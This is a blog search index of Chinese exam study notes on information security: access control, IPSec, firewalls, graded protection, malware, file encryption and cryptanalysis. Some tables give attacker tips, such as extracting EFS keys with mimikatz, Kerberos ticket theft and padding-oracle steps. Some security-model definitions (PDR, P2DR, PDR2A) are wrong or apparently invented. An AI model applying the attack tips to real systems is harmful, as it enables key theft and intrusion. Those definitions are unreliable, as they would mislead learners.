<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>安全</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E4%BF%A1%E5%AE%89%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80/%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="1信息安全的三个最基本原则"><a class="markdownIt-Anchor" href="#1信息安全的三个最基本原则"></a> 1.信息安全的三个最基本原则:</h2>
<h3 id="最小化原则"><a class="markdownIt-Anchor" href="#最小化原则"></a> 最小化原则</h3>
<ul>
<li>受保护的敏感信息只能在一定范围内被共享，履行工作职责和职能的安全主体，在法律和相关安全策略允许的前提下，为满足工作需要。仅被授予其访问信息的适当权限，称为最小化原则。敏感信息的。知情权”一定要加以限制，是在“满足工作需要”前提下的一种限制性开放。可以将最小化原则细分为知所必须(need to know)和用所必须的原则。</li>
</ul>
<h3 id="分权制衡原则"><a class="markdownIt-Anchor" href="#分权制衡原则"></a> 分权制衡原则</h3>
<ul>
<li>在信息系统中，对所有权限应该进行适当地划分，使每个授权主体只能拥有其中的一部分权限，使他们之间相互制约、相互监督，共同保证信息系统的安全。如果—个授权主体分配的权限过大，无人监督和制约，就隐含了“滥用权力”、“一言九鼎”的安全隐患</li>
</ul>
<h3 id="安全隔离原则"><a class="markdownIt-Anchor" href="#安全隔离原则"></a> 安全隔离原则</h3>
<ul>
<li>离和控制是实现信息安全的基本方法，而隔离是进行控制的基础。信息安全的一个基本策略就是将信息的主体与客体分离，按照一定的安全策略，在可控和安全的前提下实施主体对客体的访问。</li>
</ul>
<h2 id="2信息安全的三个基本原则cia"><a class="markdownIt-Anchor" href="#2信息安全的三个基本原则cia"></a> 2.信息安全的三个基本原则CIA:</h2>
<ul>
<li>
<p><strong>机密性 (Confidentiality)</strong>：确保敏感信息仅被授权用户访问。</p>
</li>
<li>
<p><strong>完整性 (Integrity)</strong>：保证数据在存储和传输过程中未被未经授权修改。</p>
</li>
<li>
<p><strong>可用性 (Availability)</strong>：确保信息和系统在需要时可以被及时访问和使用。</p>
</li>
</ul>
<h2 id="3访问控制模型dacmacrbacabac"><a class="markdownIt-Anchor" href="#3访问控制模型dacmacrbacabac"></a> 3.访问控制模型（DAC,MAC,RBAC,ABAC）</h2>
<h3 id="基本要素"><a class="markdownIt-Anchor" href="#基本要素"></a> 基本要素</h3>
<p>访问控制模型包括三个要素，即：</p>
<ul>
<li>主体（Subject) 指主动对其它实体施加动作的实体</li>
<li>客体(Object) 是被动接受其他实体访问的实体</li>
<li>控制策略(Policy)为主体对客体的操作行为和约束条件</li>
</ul>
<h3 id="安全策略"><a class="markdownIt-Anchor" href="#安全策略"></a> 安全策略</h3>
<p>主体、客体，控制策略三者需要满足的基本安全策略：</p>
<p>最小特权原则：给主体分配权限时要遵循权限最小化原则，最小特权原则的优点是最大限度地限制了主体实施授权行为，可以避免来自突发事件、错误和未授权用主体的危险。</p>
<p>最小泄漏原则：它是指主体执行任务时,按照主体所需要知道的信息最小化的原则分配给主体权利。也就是要保护敏感信息不要被无关人员知道，别人知道得越少越好。</p>
<p>多级安全策略：多级安全策略是指主体和客体间的数据流向和权限控制按照安全级别的绝密（TS）、秘密（S）、机密（C）、限制（RS）和无级别（U）五级来划分。多级安全策略的优点是避免敏感信息的扩散，只有安全级别比他高的主体才能够访问。</p>
<h3 id="发展"><a class="markdownIt-Anchor" href="#发展"></a> 发展</h3>
<p>1985年美国军方提出可信计算机系统评估准则TCSE，描述了两种著名的访问控制策略，自主访问控制模型（DAC）和强制访问控制模型（MAC）。基于角色的访问控制模型（RBAC）在1992年被提出。基于属性的访问控制模型(ABAC)则被认为是访问控制模型的未来。</p>
<h3 id="自主访问控制模型dac"><a class="markdownIt-Anchor" href="#自主访问控制模型dac"></a> 自主访问控制模型（DAC）</h3>
<p>自主访问控制模型（DAC，Discretionary Access Control）是根据自主访问控制策略建立的一种模型，允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体。拥有客体权限的用户，可以将该客体的权限分配给其他用户。例如没有文件File1访问权限的用户可以从有访问权限的B用户那里得到访问权限。</p>
<h4 id="权限控制列表acl"><a class="markdownIt-Anchor" href="#权限控制列表acl"></a> 权限控制列表（ACL）</h4>
<p>访问控制列表(ACL, Access Control List)，每一个客体都配有一个列表，这个列表记录了主体对客体进行何种操作。当系统试图访问客体时，先检查这个列表中是否有关于当前用户的访问权限。ACL是一种面向资源的访问控制模型，它的机制是围绕资源展开的。</p>
<p>对于一个文件对象的ACL：</p>
<p>Alice: read,write<br />
Bob: read<br />
表示Alice可以对该文件进行读写操作，Bob只能读取。</p>
<h4 id="dac应用场景"><a class="markdownIt-Anchor" href="#dac应用场景"></a> DAC应用场景</h4>
<p>DAC常见于文件系统，LINUX，UNIX、WindowsNT版本的操作系统都提供DAC的支持。在实现上，先对用户鉴权，然后根据控制列表决定用户能否访问资源。用户控制权限的修改通常由特权用户或者管理员组实现。DAC最大缺陷就是对权限控制比较分散，比如无法简单地将一组文件设置统一的权限开放给指定的一群用户。主体的权限太大,无意间就可能泄露信息。</p>
<h3 id="强制访问控制模型mac"><a class="markdownIt-Anchor" href="#强制访问控制模型mac"></a> 强制访问控制模型（MAC）</h3>
<p>强制访问控制模型(MAC, Mandatory Access Control),是为了弥补DAC权限控制过于分散的问题而诞生的。</p>
<p>Subject被赋予一定的安全级别<br />
Object被赋予一定的安全级别<br />
Subject能否访问Object由双方的关系安全级别决定，这个判断通常有系统硬性限制</p>
<p>MAC非常适合机密机构或者其他等级观念强烈的行业，过重强调保密性，管理不够灵活。在实现上，MAC和DAC通常为每个用户赋予对客体的访问权限规则集，考虑到管理的方便，在这一过程中还经常将具有相同职能的用户聚为组，然后再为每个组分配许可权。</p>
<h3 id="基于角色的访问控制rbac"><a class="markdownIt-Anchor" href="#基于角色的访问控制rbac"></a> 基于角色的访问控制(RBAC)</h3>
<p>基于角色的访问控制(RBAC, Role Based Access Control)在用户和权限之间引入了“角色（Role）”的概念，角色解耦了用户和权限之间的关系。<br />
角色和组的主要区别：</p>
<p>组是用户的集合<br />
角色是权限的集合<br />
角色/权限之间的变化比组/用户关系之间的变化相对要慢得多，减小了授权管理的复杂性</p>
<h3 id="基于属性的访问控制abac"><a class="markdownIt-Anchor" href="#基于属性的访问控制abac"></a> 基于属性的访问控制(ABAC)</h3>
<p>基于属性的访问控制(ABAC, Attribute Based Access Control)通过动态计算一个或一组属性是否满足某种条件来进行授权判断。可以按需实现不同颗粒度的权限控制，但定义权限时不易看出用户和对象间的关系。如果规则复杂，容易给管理者带来维护和追查带来麻烦。</p>
<p>属性通常来说分为四类：</p>
<p>用户属性（如用户年龄)<br />
环境属性（如当前时间）<br />
操作属性（如读取)<br />
对象属性（如一篇文章，又称资源属性）<br />
跟RBAC相比，ABAC对权限的控制粒度更细，如控制用户的访问速率。实际开发中可以结合RBAC角色管理的优点和ABAC的灵活性一起使用。</p>
<h2 id="4用户与访问的信息的读写关系"><a class="markdownIt-Anchor" href="#4用户与访问的信息的读写关系"></a> 4.用户与访问的信息的读写关系：</h2>
<p>下读（read down）：用户级别高于文件级别的读操作；</p>
<p>上写（write up）：用户级别低于文件级别的写操作；</p>
<p>下写（write down）：用户级别高于文件级别的写操作；</p>
<p>上读（read up）：用户级别低于文件级别的读操作。</p>
<h2 id="5两种防御技术"><a class="markdownIt-Anchor" href="#5两种防御技术"></a> 5.两种防御技术:</h2>
<h3 id="主动防御"><a class="markdownIt-Anchor" href="#主动防御"></a> 主动防御</h3>
<p>主动防御是指在潜在攻击发生之前，采取一系列积极的措施来预防和减轻可能的风险。</p>
<p>被动防御</p>
<p>被动防御则是在攻击发生后采取的措施，主要用于应对已经发生的攻击并减轻损失。</p>
<h2 id="6五种安全模型"><a class="markdownIt-Anchor" href="#6五种安全模型"></a> 6.五种安全模型:</h2>
<ul>
<li>PDR模型<br />
PDR模型，即Policy（策略）、Defense（防御）和Response（响应）模型，是一种基于策略的安全模型。它强调根据安全策略进行防御和响应，以减少安全风险。</li>
<li>P2DR模型<br />
P2DR模型是在PDR模型的基础上发展而来的，增加了Perceive（感知）组件。该模型通过感知网络中安全状态的变化，动态调整防御和响应措施，以提高系统的安全性。</li>
<li>PDR2模型<br />
PDR2模型是对P2DR模型的扩展，增加了Recovery（恢复）组件。该模型不仅关注防御和响应，还强调系统在遭受攻击后的恢复能力，以确保系统的可用性和完整性。</li>
<li>PDR2A模型<br />
PDR2A模型是PDR2模型的进一步扩展，增加了Adaptation（自适应）组件。该模型强调系统应具备自适应能力，能够根据环境变化自动调整安全策略和机制，以应对不断变化的网络威胁。</li>
<li>WPDRRC模型<br />
WPDRRC模型是一种综合性的安全模型，包括预警（Warning）、预防（Prevention）、检测（Detection）、响应（Response）、恢复（Recovery）和反击（Counterattack）六个组件。该模型强调在网络安全中需要综合运用各种技术和手段，实现全方位的安全防护。</li>
</ul>
<h2 id="7ipsec协议"><a class="markdownIt-Anchor" href="#7ipsec协议"></a> 7.IPSec协议:</h2>
<h4 id="1功能划分"><a class="markdownIt-Anchor" href="#1功能划分"></a> 1.功能划分:</h4>
<ul>
<li>
<p>认证头(Authentication Header, AH) :用于数据完整性认证和数据源认证。</p>
</li>
<li>
<p>封装安全负荷( Encapsulating Security Payload, ESP) :提供数据保密性和数据完整</p>
<p>性认证，ESP 也包括了防止重放攻击的顺序号。</p>
</li>
<li>
<p>Internet密钥交换协议( Internet Key Exchange, IKE) :用于生成和分发在ESP和AH .</p>
<p>中使用的密钥，IKE也对远程系统进行初始认证。</p>
</li>
</ul>
<h4 id="2ah协议"><a class="markdownIt-Anchor" href="#2ah协议"></a> 2.AH协议:</h4>
<p>IPSec认证头提供了数据完整性和数据源认证，即用来保证传输的IP报文的来源可信和数据不被篡改，但它并不提供加密功能。AH协议在每个数据包的标准IP报文头后面添加一个AH报文头，AH协议对报文的完整性校验的范围是整个IP报文。AH包含了对称密钥的散列函数，使得第三方无法修改传输中的数据。</p>
<h4 id="3esp协议"><a class="markdownIt-Anchor" href="#3esp协议"></a> 3.ESP协议:</h4>
<p>IPSec封装安全负荷提供了数据加密功能。ESP利用对称密钥对IP数据(例如TCP包)进行加密</p>
<h4 id="4ike协议"><a class="markdownIt-Anchor" href="#4ike协议"></a> 4.IKE协议:</h4>
<ul>
<li>为IPSec协商生成密钥，供AH/ESP加解密和验证使用</li>
<li>在IPSec通信双方之间，动态地建立安全关联（SA），对SA进行管理和维护</li>
</ul>
<h2 id="8防火墙技术"><a class="markdownIt-Anchor" href="#8防火墙技术"></a> 8.防火墙技术:</h2>
<h3 id="1分类"><a class="markdownIt-Anchor" href="#1分类"></a> 1.分类:</h3>
<ul>
<li>网络层防火墙<br />
网络层防火墙可视为一种 IP 封包过滤器，运作在底层的TCP/IP协议堆栈上。可以以枚举的方式只允许符合特定规则的封包通过，其余的一概禁止穿越防火墙（病毒除外，防火墙不能防止病毒侵入）。这些规则通常可以经由管理员定义或修改，不过某些防火墙设备可能只能套用内置的规则。</li>
<li>应用层防火墙<br />
应用层防火墙是在 TCP/IP 堆栈的“应用层”上运作，您使用浏览器时所产生的数据流或是使用 FTP 时的数据流都是属于这一层。应用层防火墙可以拦截进出某应用程序的所有封包，并且封锁其他的封包（通常是直接将封包丢弃）。理论上，这一类的防火墙可以完全阻绝外部的数据流进到受保护的机器里。</li>
<li>数据库防火墙<br />
数据库防火墙是一款基于数据库协议分析与控制技术的数据库安全防护系统。基于主动防御机制，实现数据库的访问行为控制、危险操作阻断、可疑行为审计。<br />
数据库防火墙通过SQL协议分析，根据预定义的禁止和许可策略让合法的SQL操作通过，阻断非法违规操作，形成数据库的外围防御圈，实现SQL危险操作的主动预防、实时审计。<br />
数据库防火墙面对来自于外部的入侵行为，提供SQL注入禁止和数据库虚拟补丁包功能。</li>
</ul>
<h3 id="2原理"><a class="markdownIt-Anchor" href="#2原理"></a> 2.原理:</h3>
<ul>
<li>包过滤（Packet filtering）：工作在网络层，仅根据数据包头中的IP地址、端口号、协议类型等标志确定是否允许数据包通过。  —不检查内容</li>
<li>应用代理（Application Proxy）：工作在应用层，通过编写不同的应用代理程序，实现对应用层数据的检测和分析。</li>
<li>状态检测（Stateful Inspection）：工作在2~4层，访问控制方式与1同，但处理的对象不是单个数据包，而是整个连接，通过规则表和连接状态表，综合判断是否允许数据包通过。</li>
<li>完全内容检测（Compelete Content Inspection）：工作在2~7层，不仅分析数据包头信息、状态信息，而且对应用层协议进行还原和内容分析，有效防范混合型安全威胁。</li>
</ul>
<h2 id="9等保"><a class="markdownIt-Anchor" href="#9等保"></a> 9.等保:</h2>
<h3 id="1定义"><a class="markdownIt-Anchor" href="#1定义"></a> 1.定义:</h3>
<p>“等保”即网络安全等级保护，是指对网络信息和信息载体按照重要程度划分等级，并基于分级，针对性地开展安全保护工作。网络安全等级保护制度是我国网络安全领域现行的基本制度。</p>
<h3 id="2环节"><a class="markdownIt-Anchor" href="#2环节"></a> 2.环节:</h3>
<p>等保的实施流程分为5个环节：系统定级、备案、建设整改、等级测评和监督检查；</p>
<h3 id="3等保测评的等级划分"><a class="markdownIt-Anchor" href="#3等保测评的等级划分"></a> 3.等保测评的等级划分:</h3>
<p>当前我国实行的网络安全等级保护制度，将等级保护对象按照受破坏时所侵害的客体和对客体造成侵害的程度，从低到高划分了五个安全保护等级：</p>
<ul>
<li>
<p>第一级：等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益；</p>
</li>
<li>
<p>第二级：等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序和公共利益造成损害，但不损害国家安全；</p>
</li>
<li>
<p>第三级：等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生特别严重损害，或者对社会秩序和公共利益造成严重损害，或者对国家安全造成损害；</p>
</li>
<li>
<p>第四级：等级保护对象受到破坏后，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害；</p>
</li>
<li>
<p>第五级：等级保护对象受到破坏后，会对国家安全造成特别严重损害。</p>
</li>
</ul>
<h2 id="10深度行为检测技术"><a class="markdownIt-Anchor" href="#10深度行为检测技术"></a> 10.深度行为检测技术:</h2>
<h3 id="1分类-2"><a class="markdownIt-Anchor" href="#1分类-2"></a> 1.分类:</h3>
<ul>
<li><strong>深度包检测技术（Deep Packet Inspection，DPI）</strong></li>
<li><strong>深度流检测技术（Deep Flow Inspection，DFI）</strong></li>
</ul>
<h3 id="2深度包检测技术dpi"><a class="markdownIt-Anchor" href="#2深度包检测技术dpi"></a> 2.深度包检测技术(DPI):</h3>
<p>是一种基于网络层的安全技术，主要用于识别和控制网络流量。它可以检测每个数据包的内容，包括应用层协议、数据负载等，以确定数据包的来源、目的、类型等信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">深度包检测技术可分为三类：</span><br><span class="line">    基于“特征字”的检测技术</span><br><span class="line">    基于应用网关的检测技术</span><br><span class="line">    基于行为模式的检测技术</span><br></pre></td></tr></table></figure>
<h4 id="1基于特征字的检测技术"><a class="markdownIt-Anchor" href="#1基于特征字的检测技术"></a> 1.<strong>基于“特征字”的检测技术</strong>:</h4>
<p>**特征字：**是指在特定的网络协议、应用程序或数据中具有独特标识意义的字符串或字节序列</p>
<p>基于特征字的包检测技术主要针对数据包中的特征字，例如Host字段、UA字段等等</p>
<h4 id="2基于应用网关的检测技术"><a class="markdownIt-Anchor" href="#2基于应用网关的检测技术"></a> 2.基于应用网关的检测技术:</h4>
<p>有些应用控制和数据是分离的，比如一些视屏流。一开始会通过TCP协议链接之后，协商一些参数，这部分我们称为信令部分。只写正式传输数据流量通过UDP协议，而这部分流量是没有可以识别的特征的。因此，这些应用可以基于应用网关来进行检测，即基于前面的信令部分来进行识别和控制</p>
<h4 id="3基于行为模式的检测技术"><a class="markdownIt-Anchor" href="#3基于行为模式的检测技术"></a> 3.基于行为模式的检测技术:</h4>
<p>通过分析用户或系统的行为模式来识别异常或潜在威胁的方法。通过收集和分析用户或系统的行为数据，建立正常行为模式，并实时监测和比较当前行为与正常行为模式之间的差异，从而识别出异常或潜在威胁</p>
<h3 id="3深度流检测技术dfi"><a class="markdownIt-Anchor" href="#3深度流检测技术dfi"></a> 3.深度流检测技术(DFI):</h3>
<p>流特征选择、流特征提取、分类器</p>
<p>一种基于流量行为的应用识别技术</p>
<p>DFI仅对流量进行分析，所以，只能对应用类型进行笼统的分类，无法识别出具体的应用；DPI进行检测会更加精细和精准；2，如果数据包进行加密传输，则采用DPI方式将不能识别具体的应用，除非有解密 手段；但是，加密并不会影响数据流本身的特征，所以，DFI的方式不受影响。</p>
]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>信安原理基础</category>
      </categories>
  </entry>
  <entry>
    <title>恶意代码</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E4%BF%A1%E5%AE%89%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h2 id="1病毒与木马"><a class="markdownIt-Anchor" href="#1病毒与木马"></a> 1.病毒与木马：</h2>
<ol>
<li>病毒：指编制或在计算机程序中插入的破坏计算机功能或破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或程序代码。</li>
<li>木马：是一种后门程序，被黑客用作控制远程计算机的工具。木马与病毒不同的是，木马不会自我繁殖，并不会刻意地感染其他文件，它的作用就是为黑客打开远程计算机的门户，从而可以让黑客来远程控制计算机，使黑客获取有用的信息。</li>
</ol>
<h2 id="2病毒的分类"><a class="markdownIt-Anchor" href="#2病毒的分类"></a> 2.病毒的分类：</h2>
<ol>
<li>
<p>按病毒存在的媒体</p>
<ul>
<li>
<p>网络病毒：通过网络传播，感染网络中的可执行文件。</p>
</li>
<li>
<p>文件病毒：感染计算机中的文件。</p>
</li>
<li>
<p>引导型病毒：感染启动扇区和硬盘的系统引导扇区。</p>
</li>
</ul>
</li>
<li>
<p>按病毒传染的方法分类</p>
<ul>
<li>
<p>驻留型病毒：驻留内存，并一直处于激活状态。</p>
</li>
<li>
<p>非驻留型病毒：在得到机会时才会激活，从而去感染计算机。</p>
</li>
</ul>
</li>
<li>
<p>按病毒的危害分类</p>
<ul>
<li>无危险型病毒：减少磁盘的可用空间、减少内存、显示图像发出声音等，但不影响系统。</li>
<li>危险型：造成严重的错误，删除程序、破坏数据、清除系统中重要的信息等。</li>
<li>伴随型：不改变文件本身，但产生EXE文件的伴随体。</li>
<li>“蠕虫”型：通过网络传播，占用系统内存。</li>
<li>寄生型：练习型、诡秘型、变型病毒。</li>
</ul>
</li>
</ol>
<h2 id="3病毒的命名"><a class="markdownIt-Anchor" href="#3病毒的命名"></a> 3.病毒的命名：</h2>
<ol>
<li>
<p>系统病毒</p>
<p>​	前缀为：Win32、PE、Win95、W32、W95等。此类病毒一般是感染Windows操作系统的.exe和.dll文件，并通过这些文件传播。</p>
</li>
<li>
<p>蠕虫病毒</p>
<p>​	前缀为：Worm。此类病毒通过网络或系统漏铜传播，所属蠕虫病毒都具有向外发送带毒邮件、阻塞网络的特性，如冲击波(阻塞网络)、小邮差(发带毒邮件)等。</p>
</li>
<li>
<p>木马病毒、黑客病毒</p>
<p>​	木马病毒前缀：Trojan，黑客病毒前缀：Hack。</p>
</li>
<li>
<p>脚本病毒</p>
<p>​	前缀为：Script。此类病毒使用脚本语言编写，通过网页传播。有的脚本病毒还会有如下前缀：VBS、JS(表明是哪种脚本编写的)。</p>
</li>
<li>
<p>宏病毒</p>
<p>​	前缀为：Macro。第二前缀是：Word、Excel其中之一，宏病毒是针对Office系列的。</p>
</li>
<li>
<p>后门病毒</p>
<p>​	前缀为：Backdoor。此类病毒通过网络传播，给系统开后门，给用户的计算机带来安全隐患。</p>
</li>
<li>
<p>病毒种植程序病毒</p>
<p>​	前缀为：Dropper。此类病毒是运行时从体内释放出一个或几个新的病毒到系统目录下，由释放出来的新病毒产生破坏。</p>
</li>
<li>
<p>破坏性程序病毒</p>
<p>​	前缀为：Harm。此类病毒本身具有好看的图标来诱惑用户点击，当用户点击时，病毒会对计算机产生破坏。</p>
</li>
<li>
<p>玩笑病毒</p>
<p>​	前缀为：Joke，称为恶作剧病毒。此类病毒也是本身具有好看的图标诱惑用户点击，当用户点击时，病毒会做出各种破坏操作来吓唬用户，但其实病毒并没有对计算机产生破坏。</p>
</li>
<li>
<p>捆绑机病毒</p>
<p>​	前缀为：Binder。此类病毒会使用特定的捆绑程序将病毒与一些应用程序如QQ、浏览器等捆绑起来，表面上看是正常的文件。当用户运行这些被捆绑的应用程序时，会隐藏的运行捆绑在一起的病毒，从而给用户造成危害。</p>
</li>
</ol>
<h2 id="4生命周期"><a class="markdownIt-Anchor" href="#4生命周期"></a> 4.生命周期:</h2>
<ol>
<li><strong>休眠阶段（潜伏期）</strong> 在此阶段，病毒处于非活跃状态，通常依附于宿主文件（如可执行程序或文档宏），并通过代码混淆、加密或利用零日漏洞隐藏自身。其目标是规避检测并在系统中驻留。例如，“幻影”勒索病毒可潜伏数周以收集环境信息。防御措施包括使用静态代码分析工具、启用可信启动机制以及定期更新病毒特征库。</li>
<li><strong>传播阶段（扩散期）</strong> 病毒通过复制自身实现扩散，常见传播途径包括可移动介质（如U盘）、网络漏洞（如SMB协议漏洞）以及钓鱼邮件中的恶意附件。统计显示，大部分初始感染源于钓鱼邮件。防御策略包括应用程序白名单、网络分段隔离以及邮件网关沙箱技术。</li>
<li><strong>触发阶段（激活期）</strong> 病毒在满足特定条件时激活其恶意功能，触发机制可能包括时间触发（如特定日期）、用户操作触发（如键盘记录器）或系统事件触发（如内存后门）。例如，“计时沙漏”病毒在系统运行720小时后触发数据加密。防御措施包括监控异常进程行为、配置系统审计策略以及实施最小权限原则。</li>
<li><strong>发作阶段（破坏期）</strong> 病毒在此阶段执行最终的恶意操作，可能表现为数据破坏（如文件加密勒索）、资源占用（如DDoS攻击）或信息窃取（如键盘记录）。防御手段包括实时行为监控、网络流量分析以及离线备份机制以确保数据可恢复。</li>
</ol>
]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>信安原理基础</category>
      </categories>
  </entry>
  <entry>
    <title>加密</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E5%AF%86%E7%A0%81/%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="1linxu系统文件加密"><a class="markdownIt-Anchor" href="#1linxu系统文件加密"></a> 1.linxu系统文件加密:</h2>
<table>
<thead>
<tr>
<th>技术</th>
<th>全称</th>
<th>工作原理</th>
<th>特点</th>
<th>安全/攻击要点</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>AFS</strong></td>
<td>Andrew File System</td>
<td>分布式文件系统，最早由 CMU 开发，支持跨网络的统一命名空间。AFS 本身并非主要加密实现，但结合 Kerberos 提供认证、访问控制。</td>
<td>优势在于分布式共享、集中认证；加密主要依赖外部机制。</td>
<td>攻击者可尝试 Kerberos 票据窃取/重放（TGT/TGS）；配置不当易出现明文传输。</td>
</tr>
<tr>
<td><strong>TCFS</strong></td>
<td>Transparent Cryptographic File System</td>
<td>Linux 内核模块，文件系统层实现透明加密，用户无需手工调用加解密。密钥绑定到用户身份。</td>
<td>使用 NFS 的扩展，文件透明加解密，用户体验较好。</td>
<td>早期算法较弱（如 DES）；若密钥管理不当，root 权限可直接绕过。</td>
</tr>
<tr>
<td><strong>CFS</strong></td>
<td>Cryptographic File System</td>
<td>基于用户空间（借助 NFS loopback）的文件加密系统。需要用户挂载时输入密码。</td>
<td>简单、易用，文件透明加解密。</td>
<td>因运行在用户空间，性能较差；密码暴力破解风险高。</td>
</tr>
</tbody>
</table>
<h2 id="2windows系统文件加密"><a class="markdownIt-Anchor" href="#2windows系统文件加密"></a> 2.windows系统文件加密:</h2>
<table>
<thead>
<tr>
<th>技术</th>
<th>全称</th>
<th>工作原理</th>
<th>特点</th>
<th>安全/攻击要点</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>EFS</strong></td>
<td>Encrypting File System</td>
<td>Windows 内置，NTFS 的扩展功能。使用对称加密（AES、以前是 DESX），文件加密密钥 (FEK) 再用用户公钥（RSA）加密存储。</td>
<td>与 NTFS 无缝集成；用户/管理员可透明访问加密文件。</td>
<td>攻击者若拿到用户私钥（存放在证书存储中，常在 <code>%APPDATA%\Microsoft\Crypto</code>），即可解密；可通过 DPAPI/密钥导出工具（如 mimikatz）窃取。</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>密码</category>
      </categories>
  </entry>
  <entry>
    <title>应用</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E5%AF%86%E7%A0%81/%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h2 id="1对密码学的四种攻击方式"><a class="markdownIt-Anchor" href="#1对密码学的四种攻击方式"></a> 1.对密码学的四种攻击方式:</h2>
<table>
<thead>
<tr>
<th style="text-align:left">攻击类型</th>
<th>前提 / 攻击者可获得的条件</th>
<th>CTF/攻击者思路（步骤化）</th>
<th>常用工具 / 命令示例</th>
<th>典型脆弱点 / 实例</th>
<th>防御与检测要点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">密文仅有 (Ciphertext-only)</td>
<td>只有密文集合（可能大量）</td>
<td>1. 收集尽可能多密文；2. 统计分析（频率、重复块、重复 IV、块模式）；3. 尝试已知语言统计（单字/双字/词频）；4. 对流/置换/经典密码做穷举/频率破解。</td>
<td><code>python</code> 统计脚本、<code>binwalk</code>（嵌入式），写脚本做字频；自写差分/熵分析</td>
<td>经典替换/置换、单字节异或流漏洞、重复 IV 导致 ECB 模式可见模式</td>
<td>使用 AEAD、CBC-HMAC/ GCM；不可重用 IV/nonce；监控重复密文模式与异常低熵事件</td>
</tr>
<tr>
<td style="text-align:left">已知明文 (Known-plaintext)</td>
<td>攻击者拥有若干（密文, 明文）对</td>
<td>1. 用明文-密文对恢复密钥材料或部分轮函数信息；2. 对对称分组加密可做密钥猜测减少空间；3. 对流密码可恢复 keystream，从而解出其它密文。</td>
<td>Python/Scapy 回放脚本；<code>xor</code> 工具；针对 RC4/OTP 写脚本</td>
<td>OTP 重用（同一 keystream） → 明文 XOR 明文；RC4 初始态偏差；对称算法小密钥空间</td>
<td>不重用 keystream/nonce；密钥长度足够并定期轮换；密钥派生与盐/nonce 结合</td>
</tr>
<tr>
<td style="text-align:left">选择明文 (Chosen-plaintext)</td>
<td>攻击者可提交任意明文并获得对应密文（或密文泄露）</td>
<td>1. 设计特定明文来泄露密钥信息或结构（比如构造大量相同块观察 ECB）；2. 对流密码：注入明文看输出流以推断 keystream；3. 对公钥：用于构造攻击样例（例如 RSA 同模）。</td>
<td>自建请求脚本（curl、requests）、自动化 fuzz 工具</td>
<td>ECB 模式下明文块可见；流密码 keystream 泄露；RSA 指数/填充缺陷被利用</td>
<td>不提供任意明文加密接口；对外加密服务做速率/权限控制；对公钥服务做输入校验与限流</td>
</tr>
<tr>
<td style="text-align:left">选择密文 (Chosen-ciphertext)</td>
<td>攻击者可提交任意密文并获得解密结果或可观测到解密行为/错误</td>
<td>1. 利用解密错误/响应差别进行 oracle 攻击；2. CBC 填充 Oracle、Bleichenbacher（RSA-PKCS#1 v1.5）等；3. 逐字节构造解密路径恢复明文/会话密钥。</td>
<td><code>paddingoracle</code> 脚本；<code>PadBuster</code>；自写脚本循环改密文字节</td>
<td>Padding oracle（CBC）、Bleichenbacher 对 RSA 的攻击</td>
<td>采用认证加密（AES-GCM/ChaCha20-Poly1305）；在解密时不要泄露错误分类；统一错误信息与延迟</td>
</tr>
</tbody>
</table>
<h2 id="2公钥基础设施pki"><a class="markdownIt-Anchor" href="#2公钥基础设施pki"></a> 2.公钥基础设施(PKI):</h2>
<h3 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理:</h3>
<p>第三方权威机构—身份认证中心 CA，将用户所持有的公开密钥与其身份信息（如名称、电话等）结合在一起。在两者相结合之前，由身份认证中心 CA 证实用户身份的真实性，而后身份认证中心 CA 给用户及其公开密钥捆绑的证书签名，则签名证书有效。每个用户均拥有一对公钥和私钥，其中公钥在网络中是公开的，用于文件发送时对信息进行加密；私钥是保密的，只归用户所有，用于对文件信息进行解密和签名。当准备发送消息时，发送方使用接收方的公开密钥加密要传输的数据，接收方得到数据后用其所持有的私有密钥来解密灵气，这样，用户可以在 PKI 服务平台安全通信。</p>
<h3 id="2组成"><a class="markdownIt-Anchor" href="#2组成"></a> 2.组成:</h3>
<h4 id="认证机构-ca"><a class="markdownIt-Anchor" href="#认证机构-ca"></a> 认证机构 CA：</h4>
<p>它是数字证书的颁布机关，也是 PKI 体系的核心，是具有权威性、公正性的第三方机构。认证机构 CA 首先确认申请证书的申请用户身份，然后将要颁发的证书的主体与公钥捆绑在一起，生成数字证书，从而使申请用户与一对公钥和私钥建立对应关系。</p>
<h4 id="注册机构-ra"><a class="markdownIt-Anchor" href="#注册机构-ra"></a> 注册机构 RA：</h4>
<p>它负用来收用户的申请，审核用户的真实身份，符合颁发证书条件的用户可以被颁布数字证书，否则将不能获得数字证书。</p>
<h4 id="数字证书库"><a class="markdownIt-Anchor" href="#数字证书库"></a> 数字证书库：</h4>
